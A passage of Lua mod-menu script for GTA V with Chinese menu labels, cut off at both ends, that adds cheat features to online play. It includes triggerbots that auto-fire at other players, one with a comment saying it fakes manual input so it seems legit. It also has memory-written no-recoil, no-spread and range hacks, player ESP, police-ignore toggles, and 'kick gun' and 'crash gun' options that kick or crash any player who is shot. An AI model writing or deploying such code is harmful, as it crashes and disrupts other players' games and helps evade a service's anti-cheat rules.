        if ghost then
        all_peds = entities.get_all_peds_as_handles()
        user_ped = players.user_ped()
        clone = PED.CLONE_PED(user_ped,true, true, true)
        pos = ENTITY.GET_ENTITY_COORDS(clone, false)
		ENTITY.SET_ENTITY_COORDS(user_ped, pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), 87, false)
        ENTITY.SET_ENTITY_INVINCIBLE(clone,true)
        menu.trigger_commands("invisibility remote")
        util.create_tick_handler(function()
        STREAMING.REQUEST_ANIM_DICT("move_crawl")
        PED.SET_PED_MOVEMENT_CLIPSET(clone, "move_crawl", -1)
        mod_uses("ped", if on then 1 else -1)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        return ghost
        end)
        else
            clonepedpos = ENTITY.GET_ENTITY_COORDS(clone, false)
            ENTITY.SET_ENTITY_COORDS(user_ped, clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
            entities.delete_by_handle(clone)
            ENTITY.SET_ENTITY_ALPHA(user_ped, 255, false)
            menu.trigger_commands("invisibility off")
        end
    end)

menu.toggle_loop(funfeatures_self, "一拳超人", {""}, "", function()
    supermanpersonl()
end)

menu.toggle(selflist, "平民", {}, ":)", function(toggle)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(), toggle) --handcuff on / off
end)

menu.toggle_loop(funfeatures_self, "大B斗", {""}, "不要动鼠标", function()
    bigpussy()
end, function ()
	TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
	ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
	ENTITY.SET_ENTITY_VISIBLE(object, false)
	entities.delete_by_handle(object)
	state = 0
end)
    
menu.toggle(selflist, "空中游泳", {}, "", function(on)
    if on then
        menu.trigger_commands("swiminair on")
    else
        menu.trigger_commands("swiminair off")
    end
end)


menu.toggle_loop(selflist, "警察无视", {}, "", function(toggle)
    PLAYER.SET_POLICE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), toggle)
end)

menu.toggle_loop(selflist, "所有人无视", {}, "", function(toggle)
    PLAYER.SET_EVERYONE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), toggle)
end)

menu.toggle_loop(selflist, "行动无声", {}, "", function()
    PLAYER.SET_PLAYER_NOISE_MULTIPLIER(PLAYER.PLAYER_ID(), 0.0)
end)

menu.toggle_loop(funfeatures_self, "显示轴向", {}, "", function(toggle)
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    GRAPHICS.DRAW_LINE(c.x, c.y, c.z, c.x + 2, c.y, c.z, 255, 0, 0, 255) --x
    GRAPHICS.DRAW_LINE(c.x, c.y, c.z, c.x, c.y + 2, c.z, 0, 255, 0, 255) --y
    GRAPHICS.DRAW_LINE(c.x, c.y, c.z, c.x, c.y, c.z + 2, 0, 0, 255, 255) --z
end)

 menu.toggle_loop(funfeatures_self, "线", {}, "连接玩家的线", function(toggle)
        c = ENTITY.GET_ENTITY_COORDS(players.user_ped()) 
        p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        j = ENTITY.GET_ENTITY_COORDS(p) 
        GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255) 
    end)

menu.action(funfeatures_self, "警察", {}, "成为警察", function()
    becomepoliceman()
end)

menu.action(funfeatures_self, "拉屎", {}, "", function()
    personlshit()
end)

menu.action(funfeatures_self, "打飞机", {}, "我还需要解释这个吗", function()
    personlhitplane()
end)

finger_thing = menu.list(weapon_options, "手指枪 [B键]", {}, "")
fingergun()

anti_aim_root = menu.list(weapon_options, "反瞄准", {"antiaim"}, "防止玩家直接瞄准你。大多数挂壁不会受到该保护措施的影响。")
anti_aim = false
menu.toggle(anti_aim_root, "反瞄准", {"antiaim"},  "防止玩家直接瞄准你。大多数挂壁不会受到该保护措施的影响。", function(on)
    anti_aim = on
    mod_uses("player", if on then 1 else -1)
end)

anti_aim_notify = false
menu.toggle(anti_aim_root, "当我被瞄准时通知我", {""},  "", function(on)
    anti_aim_notify = on
end)

anti_aim_angle = 2
menu.click_slider(anti_aim_root, "反瞄准角度", {"antiaimangle"}, "基本上是你周围的半径，玩家必须瞄准这个半径，以防反瞄准阻止", 0, 180, 2, 1, function(s)
    anti_aim_angle = s
end)

local anti_aim_type = 1
menu.list_select(anti_aim_root, "反瞄准方法", {"antiaimmethod"}, "如何使用反瞄准",  anti_aim_types, 1, function(index)
    anti_aim_type = index
end)

triggerbot_root = menu.list(weapon_options, "扳机机器人", {}, "扳机机器人将让你的武器自动开火当你将武器正确的瞄准到某个目标时，允许你非常准确地快速瞄准敌人。")

menu.toggle_loop(triggerbot_root, "扳机机器人", {"triggerbot"},  "扳机机器人将让你的武器自动开火当你将武器正确的瞄准到某个目标时，允许你非常准确地快速瞄准敌人。", function(on)
    trigger(on)
end)

menu.click_slider(triggerbot_root, "射击镜头之间的延迟", {}, "每次 \"射击\" 之间的延迟.", 10, 5000, 100, 1, function(s)
    triggerbot_delay = s
end)
    
    custom_weapon_save = menu.list(weapon_options, '武器保存', {}, '')
    
    save_loadout = custom_weapon_save:action("保存武器", {}, "保存所有当前装备的武器及其附件，以便将来装载", function()
        Save_Weapon_Profile()
    end)

    load_loadout = custom_weapon_save:action("加载上次保存武器", {"loadloadout"}, "装备上次保存的每一件武器", function()
        Load_Out_Weapon()
    end)

    auto_load = custom_weapon_save:toggle("自动加载", {}, "加入新战局时，自动装备上次保存的每件武器", function(on)
        Auto_Load_Out_Weapon(on)
    end)

    from_scratch = custom_weapon_save:action("从头开始", {}, "删除你当前的武器，这样你就可以按照你想要的方式构建你的装备",function()
        Dele_All_Weapon()
    end)

    custom_weapon_save:divider("编辑武器")

    Weapon_Check_Save()

    local weaponsetting = menu.list(weapon_options, '武器设置', {}, '')


    menu.toggle_loop(weaponsetting, '无后坐力', {'JSnoRecoil'}, '使用武器射击时不会抖动游戏画面.', function()
        gunpro()
    end, function()
        resetWeapons(modifiedRecoil)
    end)

    menu.toggle_loop(weaponsetting, '无限范围', {'JSinfiniteRange'}, '', function()
        maxrange()
    end, function()
        for hash, _ in pairs(modifiedRange) do
            memory.write_float(modifiedRange[hash].minAddress, modifiedRange[hash].originalMin)
            memory.write_float(modifiedRange[hash].maxAddress, modifiedRange[hash].originalMax)
            memory.write_float(modifiedRange[hash].rangeAddress, modifiedRange[hash].originalRange)
            modifiedRange[hash] = nil
        end
    end)


    menu.toggle_loop(weaponsetting, '无扩散', {'JSnoSpread'}, '', function()
        nospread()
    end, function()
        resetWeapons(modifiedSpread)
    end)

    menu.toggle_loop(weaponsetting, '移除前摇', {'JSnoSpinUp'}, '移除加特林和寡妇制造者的前摇.', function()
        nospinup()
    end, function()
        for i = 1, #modifiedSpinup do
            if modifiedSpinup[i].address then
                memory.write_float(modifiedSpinup[i].address, 0.5)
            end
        end
    end)

    menu.toggle_loop(weaponsetting, '子弹伤害修改', {'JSbulletForceMultiplier'}, '从正面射击载具时效果最佳.\n显示的值以百分比为单位.', function()
        damagemoded()
    end, function()
        resetWeapons(modifiedCarForce)
        resetWeapons(modifiedHeliForce)
        resetWeapons(modifiedPedForce)
    end)

    menu.divider(weaponsetting, '瞄准视野')

    menu.toggle_loop(weaponsetting, '启用瞄准视野缩放', {'JSenableAimFov'}, '让您在瞄准时修改视野大小.', function()
        gunzoom()
    end, function()
        resetWeapons(modifiedAimFov)
    end)

    menu.divider(weaponsetting, '放大瞄准视野')

    menu.toggle_loop(weaponsetting, '启用放大瞄准视野缩放', {'JSenableZoomFov'}, '让您在瞄准放大时修改视野大小.', function()
        enablezoomfov()
    end, function()
        resetWeapons(modifiedZoomFov)
    end)

    menu.slider_float(weaponsetting, '放大瞄准视野', {'JSzoomAimFov'}, '', 100, 9999999999, 100, 1, function(value)
        zoomaimfov(value)
    end)


    local proxysticks = menu.list(weapon_options, '粘弹自动爆炸', {}, '')


    menu.toggle_loop(proxysticks, '粘弹自动爆炸', {'JSproxyStickys'}, '使您的粘弹在玩家或NPC附近时自动引爆.', function()
        proxyStickys()
    end)

    menu.toggle(proxysticks, '引爆附近的玩家', {'JSProxyStickyPlayers'}, '如果您的粘性炸弹在玩家附近时自动引爆.', function(toggle)
        proxyStickys_players(toggle)
    end, proxyStickySettings.players)

    menu.toggle(proxysticks, '引爆附近的NPC', {'JSProxyStickyNpcs'}, '如果您的粘性炸弹在NPC附近时自动引爆.', function(toggle)
        proxystickys_npc(toggle)
    end, proxyStickySettings.npcs)

    menu.slider(proxysticks, '爆炸半径', {'JSstickyRadius'}, '粘性炸弹必须离目标多近才会引爆.', 1, 10, proxyStickySettings.radius, 1, function(value)
        proxysticks_radius(value)
    end)

    menu.action(proxysticks, '移除所有粘性炸弹', {'JSremoveStickys'}, '移除所有存在的粘性炸弹(不仅仅是你的).', function()
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(util.joaat('weapon_stickybomb'), false)
    end)


weapon_thing = menu.list(weapon_options, "子弹类型", {}, "")
bulletchange()

entity_control = menu.list(weapon_options, "实体控制枪", {}, "控制你所瞄准的实体")

menu.toggle_loop(entity_control, "开启", {}, "", function()
    entitycontrol()
end)

menu.action(entity_control, "清除记录的实体", {}, "", function()
    clearcontrollog()
end)

menu.divider(entity_control, "实体控制")


local nuke = menu.list(weapon_options, '核弹选项', {}, '')


---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(nuke, '核弹枪', {'JSnukeGun'}, '使火箭炮发出的子弹变成核弹.', mutually_exclusive_weapons, function(toggle)
    nukegunmode(toggle)
end)


menu.action(nuke, '核弹标记点', {'JSnukeWP'}, '掉落一颗核弹在您标记的位置.', function ()
    nukepoint()
end)

---@diagnostic disable-next-line: undefined-global
menu.slider(nuke, '核弹高度', {'JSnukeHeight'}, '投下核弹的高度.', 10, 100, nuke_height, 10, function(value)
    nukeheight(value)
end)


local throwables = menu.list(weapon_options, '投掷物发射器', {}, '')


---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(throwables, '投掷物发射器', {'JSgrenade'}, '使榴弹发射器能够发射可选的投掷物.', mutually_exclusive_weapons, function(toggle)
    throwablebullet(toggle)
end)


local throwables_launcher_list throwables_launcher_list = menu.list_action(throwables, '当前投掷物' ..': Grenade', {}, '选择榴弹发射器发射的投掷物.', getLabelTableFromKeys(throwablesTable), function(index, text)
    menu.set_menu_name(throwables_launcher_list, '当前投掷物' ..': '.. text)
    bulletset(text)
end)

local minecraftgun = menu.list(weapon_options, '我的世界枪', {}, '')

menu.toggle_loop(minecraftgun, '我的世界枪', {'JSminecraftGun'}, '当您射击时生成阻挡物.', function()
    xxxminecraftgun()
end)

menu.action(minecraftgun, '删除最后一个阻挡物', {'JSdeleteLastBlock'}, '', function()
    deleminecraftlastblock()
end)

menu.action(minecraftgun, '删除所有阻挡物', {'JSdeleteBlocks'}, '', function()
    deleallblock()
end)

local Gun_Effect_Shooting_Hit = menu.list(weapon_options, "开枪效果", {}, "")

menu.toggle_loop(weapon_options, '喷火器', {'JSflamethrower'}, '将加特林变成火焰喷射器.', function()
    flamegun()
end)

local function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
menu.toggle_loop(weapon_options, '3D方框瞄准', {'_3d_crosshair'}, '', function()
    request_texture_dict_load('visualflow')
    local rc = raycast_gameplay_cam(-1, 10000.0)[2]
    local c = players.get_position(players.user())
    local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(rc.x, rc.y, rc.z, c.x, c.y, c.z, false)
    local dir = v3.toDir(CAM.GET_GAMEPLAY_CAM_ROT(0))
    size = {}
    size.x = 0.5+(dist/50)
    size.y = 0.5+(dist/50)
    size.z = 0.5+(dist/50)
    GRAPHICS.DRAW_MARKER(3, rc.x, rc.y, rc.z, 0.0, 0.0, 0.0, 0.0, 90.0, 0.0, size.y, 1.0, size.x, 255, 255, 255, 50, false, true, 2, false, 'visualflow', 'crosshair')
end)

menu.toggle_loop(weapon_options, "自动开枪", {"triggerbotall"}, "", function()
    local wpn = WEAPON_SAVE_WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
    local dmg = SYSTEM.ROUND(WEAPON.GET_WEAPON_DAMAGE(wpn, 0))
    local delay = WEAPON_SAVE_WEAPON.GET_WEAPON_TIME_BETWEEN_SHOTS(wpn)
    local wpnEnt = WEAPON_SAVE_WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), false)
    local wpnCoords = ENTITY.GET_ENTITY_BONE_POSTION(wpnEnt, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(wpnEnt, "gun_muzzle"))
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if ENTITY.GET_ENTITY_ALPHA(ped) < 255 then return end
        boneIndex = bones[math.random(#bones)]
        local pos = PED.GET_PED_BONE_COORDS(ped, boneIndex, 0.0, 0.0, 0.0)
        if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and not PED.IS_PED_RELOADING(players.user_ped()) then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(wpnCoords, pos, dmg, true, wpn, players.user_ped(), true, false)
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 24, 1.0) -- shooting manually after so it has the effect of you shooting to seem more legit despite there being nothing legit about this
            util.yield(delay * 1000)
        end
    end
end)

menu.toggle_loop(weapon_options, "不公平的触发机器人", {"triggerbotall"}, "", function()
    local wpn = WEAPON_SAVE_WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
    local dmg = SYSTEM.ROUND(WEAPON.GET_WEAPON_DAMAGE(wpn, 0))
    local delay = WEAPON_SAVE_WEAPON.GET_WEAPON_TIME_BETWEEN_SHOTS(wpn)
    local wpnEnt = WEAPON_SAVE_WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), false)
    local wpnCoords = ENTITY.GET_ENTITY_BONE_POSTION(wpnEnt, ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(wpnEnt, "gun_muzzle"))
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        if ENTITY.GET_ENTITY_ALPHA(ped) < 255 then return end
        boneIndex = bones[math.random(#bones)]
        local pos = PED.GET_PED_BONE_COORDS(ped, boneIndex, 0.0, 0.0, 0.0)
        if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and not PED.IS_PED_RELOADING(players.user_ped()) then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(wpnCoords, pos, dmg, true, wpn, players.user_ped(), true, false)
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, 24, 1.0) -- shooting manually after so it has the effect of you shooting to seem more legit despite there being nothing legit about this
            util.yield(delay * 1000)
        end
    end
end)

menu.toggle_loop(Gun_Effect_Shooting_Hit, "射击效果", {"shootingfx"}, "", function ()
    shootingeffect()
end)

menu.slider_text(Gun_Effect_Shooting_Hit, "设置射击效果", {}, "", {"小丑木兹","小丑花"}, function (index)
	setshootingeffect(index)
end)


Preview = {handle = 0, modelHash = 0}
Preview.__index = Preview

---@param modelHash Hash
---@return Preview
function Preview.new(modelHash)
	local self = setmetatable({}, Preview)
	self.modelHash = modelHash
	return self
end

---@param pos v3
function Preview:create(pos, heading)
	if self:exists() then return end
	self.handle = VEHICLE.CREATE_VEHICLE(self.modelHash, pos.x, pos.y, pos.z, heading, false, false, false)
	ENTITY.SET_ENTITY_ALPHA(self.handle, 153, true)
	ENTITY.SET_ENTITY_COLLISION(self.handle, false, false)
	ENTITY.SET_CAN_CLIMB_ON_ENTITY(self.handle, false)
end

---@param rot v3
function Preview:setRotation(rot)
	ENTITY.SET_ENTITY_ROTATION(self.handle, rot.x, rot.y, rot.z, 0, true)
end

---@param pos v3
function Preview:setCoords(pos)
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self.handle, pos.x, pos.y, pos.z, false, false, false)
end

function Preview:destroy()
	entities.delete_by_handle(self.handle)
	self.handle = 0
end

function Preview:setOnGround()
	VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(self.handle, 1.0)
end

---@return boolean
function Preview:exists()
	return self.handle ~= 0 and ENTITY.DOES_ENTITY_EXIST(self.handle)
end

local vehicles <const> =
{
	"adder",
	"lazer",
	"insurgent2",
	"phantom2",
}
local modelHash = util.joaat("adder")
local preview <const> = Preview.new(modelHash)
local setIntoVehicle = false
local maxDist <const> = 100.0
local minDist <const> = 15.0
local distancePerc = 0.0
local currentDistance = minDist
local lastInput <const> = newTimer()
local vehicleGun <const> = menu.list(weapon_options,"车辆枪", {}, "")

---@return number
function get_veh_distance()
	if PAD.IS_CONTROL_JUST_PRESSED(2, 241) and distancePerc < 1.0 then
		distancePerc = distancePerc + 0.25
		lastInput.reset()

	elseif PAD.IS_CONTROL_JUST_PRESSED(2, 242) and distancePerc > 0.0 then
		distancePerc = distancePerc - 0.25
		lastInput.reset()
	end
	local distance = interpolate(minDist, maxDist, distancePerc)
	local duration <const> = 200 -- `ms`
	if currentDistance ~= distance and lastInput.elapsed() <= duration then
		currentDistance = interpolate(currentDistance, distance, lastInput.elapsed() / duration)
	end
	return currentDistance
end
local Cargun = "车枪"
menu.toggle_loop(vehicleGun,Cargun, {}, "", function ()
	request_model(modelHash)
	local camRot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	local distance = get_veh_distance()
	local raycast = get_raycast_result(distance + 5.0, TraceFlag.world)
	local coords = raycast.didHit and raycast.endCoords or get_offset_from_cam(distance)

	if not Config.general.disablepreview and
	PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
		if not preview:exists() then
			preview.modelHash = modelHash
			preview:create(coords, camRot.z)
		else
			preview:setCoords(coords)
			preview:setRotation(camRot)
			if raycast.didHit then preview:setOnGround() end
		end

		if Instructional:begin() then
			Instructional.add_control_group(29, "FM_AE_SORT_2")
			Instructional:set_background_colour(0, 0, 0, 80)
			Instructional:draw()
		end
	elseif preview:exists() then preview:destroy() end

	if PED.IS_PED_SHOOTING(players.user_ped()) then
		local veh = VEHICLE.CREATE_VEHICLE(modelHash, coords.x, coords.y, coords.z, camRot.z, true, true, false)
		NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(veh), true)
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, coords.x, coords.y, coords.z, false, false, false)
		ENTITY.SET_ENTITY_ROTATION(veh, camRot.x, camRot.y, camRot.z, 0, true)
		VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 200.0)
		if not setIntoVehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 2)
		else
			VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, true)
			PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
		end
	end
end, function()
	if preview:exists() then preview:destroy() end
end)
---@param index integer
---@param name string
function Instructional.add_control_group (index, name)
	local button = CC_PAD.GET_CONTROL_GROUP_INSTRUCTIONAL_BUTTONS_STRING(2, index, true)
    Instructional:add_data_slot(index, name, button)
end

local options_all <const> =  {{"灵蛇"}, {"天煞"}, {"叛乱分子"}, {"尖锥魅影"}}
local setshoot_other = "设置车枪"
menu.list_select(vehicleGun,setshoot_other, {}, "", options_all, 1, function (opt)
	local vehicle = vehicles[opt]
	modelHash = util.joaat(vehicle)
end)

local Csound = "HintCamSounds"
local errmsg = "您输入的车辆英文名不正确 !"
local other_car = "其他车辆"
menu.text_input(vehicleGun,other_car, {"customvehgun"}, "", function(vehicle, click)
	if (click & CLICK_FLAG_AUTO) ~= 0 then
		return
	end
	if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(vehicle)) then
		modelHash = util.joaat(vehicle)
	else notification:help(errmsg, HudColour.red) end
end)
local Entercar = "进入车辆"
menu.toggle(vehicleGun,Entercar, {}, "", function(toggle)
	setIntoVehicle = toggle
end)

local ent_types = {"没有", "行人", "载具", "实体"}
local function get_aim_info()
    local outptr = memory.alloc(4)
    local success = PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), outptr)
    local info = {}
    if success then
        local ent = memory.read_int(outptr)
        if not ENTITY.DOES_ENTITY_EXIST(ent) then
            info["ent"] = 0
        else
            info["ent"] = ent
        end
        if ENTITY.GET_ENTITY_TYPE(ent) == 1 then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ent, false)
            if veh ~= 0 then
                if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1) then
                    ent = veh
                    info['ent'] = ent
                end
            end
        end
        info["hash"] = ENTITY.GET_ENTITY_MODEL(ent)
        info["health"] = ENTITY.GET_ENTITY_HEALTH(ent)
        info["type"] = ent_types[ENTITY.GET_ENTITY_TYPE(ent)+1]
        info["speed"] = math.floor(ENTITY.GET_ENTITY_SPEED(ent))
    else
        info['ent'] = 0
    end
    return info
end

damage_numbers_list = menu.list(weapon_options, "伤害数字")


menu.toggle_loop(damage_numbers_list, "伤害数字", {"damagenumbers"}, "", function()
    damage_numbers()
end)
menu.toggle(damage_numbers_list, "包括车辆", {"damagenumbersvehicles"}, "", function (value)
    damage_numbers_target_vehicles = value
end)
menu.slider(damage_numbers_list, "数字尺寸", {"damagenumberstextsize"}, "", 1, 100, 7, 1, function (value)
    damage_numbers_text_size = value * 0.1
end)
damage_numbers_colours_list = menu.list(damage_numbers_list, "颜色设置")
menu.rainbow(menu.colour(damage_numbers_colours_list, "默认颜色", {"damagenumcolour"}, "默认命中的颜色", damage_numbers_health_colour, true, function (value)
    damage_numbers_health_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "暴击颜色", {"damagenumcritcolour"}, "暴击颜色", damage_numbers_crit_colour, true, function (value)
    damage_numbers_crit_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "盔甲颜色", {"damagenumarmourcolour"}, "盔甲颜色", damage_numbers_armour_colour, true, function (value)
    damage_numbers_armour_colour = value
end))
menu.rainbow(menu.colour(damage_numbers_colours_list, "载具颜色", {"damagenumvehiclecolour"}, "载具颜色", damage_numbers_vehicle_colour, true, function (value)
    damage_numbers_vehicle_colour = value
end))


menu.toggle_loop(weapon_options, "锁定玩家", {}, "允许您使用武装载具上的制导导弹发射器锁定玩家.", function()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        PLAYERJINX.ADD_PLAYER_TARGETABLE_ENTITY(players.user(), ped)
        ENTITY.SET_ENTITY_IS_TARGET_PRIORITY(ped, false, 400.0)    
    end
end, function()
    for _, pid in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        PLAYERJINX.REMOVE_PLAYER_TARGETABLE_ENTITY(players.user(), ped)
    end
end)

if menu.get_edition() > 1 then
    menu.toggle_loop(weapon_options, "瞄准时的透视", {"aimesp"}, "", function()
        if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Bone ESP>Low Latency Rendering"))
        else
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Bone ESP>Disabled"))
        end
    end, function()
        menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Bone ESP>Disabled"))
    end)
end

for id, data in pairs(visual_stuff) do
    local visual_name = data[1]
    local visual_thing = data[2]
    local visual = false
    local visual_toggle
    visual_toggle = menu.toggle(visuals, visual_name, {""}, "", function(toggled)
        visual = toggled
        if not menu.get_value(visual_toggle) then
            GRAPHICS.ANIMPOSTFX_STOP_ALL()
        return end

        while visual do
            repeat
            GRAPHICS.SET_TIMECYCLE_MODIFIER(visual_thing)
            menu.trigger_commands("shader off")
            util.yield()
            until GRAPHICS.GET_TIMECYCLE_MODIFIER_INDEX() ~= 728
            util.yield()
        end
        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
    end)
end 

        menu.toggle_loop(weapon_options, "踢出枪", {"kickgun"}, "", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        if players.get_host() == pid then 
                            notification("您正试图踢出的玩家是主机")
                            return
                        end
                        menu.trigger_commands("kick" .. players.get_name(pid))
                    end
                end
            end
        end)

menu.toggle_loop(weapon_options, "崩溃枪", {"crashgun"}, "", function()
    local ent = get_aim_info()['ent']
    if PED.IS_PED_SHOOTING(players.user_ped()) then
        if ENTITY.IS_ENTITY_A_PED(ent) then
            if PED.IS_PED_A_PLAYER(ent) then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                menu.trigger_commands("crash" .. players.get_name(pid))
            end
        end
    end
end)

menu.toggle_loop(weapon_options, translate("Weapon", "传送枪"), {"tpgun"}, "", function()
	local raycastResult = get_raycast_result(1000.0)
	if  raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local coords = raycastResult.endCoords
		if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
			coords.z = coords.z + 1.0
			set_entity_coords(players.user_ped(), coords)
		else
			local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
			local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
			ENTITY.SET_ENTITY_COORDS(vehicle, coords.x, coords.y, coords.z, false, false, false, false)
			ENTITY.SET_ENTITY_HEADING(vehicle, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, speed + 3.0)
		end
	end
end)

        menu.toggle_loop(weapon_options, "转换枪", {""}, "互换身份", function()
            local ent = get_aim_info()['ent']
            if PED.IS_PED_SHOOTING(players.user_ped()) then
                if ENTITY.IS_ENTITY_A_PED(ent) then
                    pos = ENTITY.GET_ENTITY_COORDS(ent, false)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), pos.x, pos.y, pos.z, false, false, false)
                    if PED.IS_PED_A_PLAYER(ent) then
                        local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ent)
                        menu.trigger_commands("copyoutfit " .. players.get_name(pid))
                    else
                    local soul = ENTITY.GET_ENTITY_MODEL(ent)
                    STREAMING.REQUEST_MODEL(soul)
                    while(not STREAMING.HAS_MODEL_LOADED(soul))
                    do
                    util.yield(10)
                        end
                    PLAYER.SET_PLAYER_MODEL(players.user(),soul)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(soul)
                    if not PED.IS_PED_A_PLAYER(ent) then
                        entities.delete_by_handle(ent)
                    end
                    util.yield(10)
                    menu.trigger_commands("allguns")
                end
            end
                if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
                    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
                if VEHICLE.GET_VEHICLE_NUMBER_OF_PASSENGERS(ent,true,false) >= 1 then
                    local soulveh = ENTITY.GET_ENTITY_MODEL(driver)
                    if not PED.IS_PED_A_PLAYER(driver) then
                        entities.delete_by_handle(driver)
                        end
                        STREAMING.REQUEST_MODEL(soulveh)
                        while(not STREAMING.HAS_MODEL_LOADED(soulveh))
                        do
                        util.yield(10)
                            end
                    PLAYER.SET_PLAYER_MODEL(players.user(),soulveh)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(soulveh)
                    util.yield(10)
                    PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
                    menu.trigger_commands("allguns")
                    end
                end
            end
    end)

EntityManipulationHandleList = {}
entityManipulation = menu.list(weapon_options, "实体操纵枪", {"emanipulation"}, "对玩家无效.")
menu.divider(entityManipulation, "实体操作")

menu.toggle_loop(entityManipulation, "启用 (添加实体)", {}, "", function()
    if (PED.IS_PED_SHOOTING(GetLocalPed()) and PLAYER.IS_PLAYER_FREE_AIMING(players.user())) then
        local entityPointer = memory.alloc()

        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), entityPointer) then
            local entityHandle = memory.read_int(entityPointer)
            --don't need the pointer anymore...
            memory.free(entityPointer)

            --put it in table so we don't add it again l8r
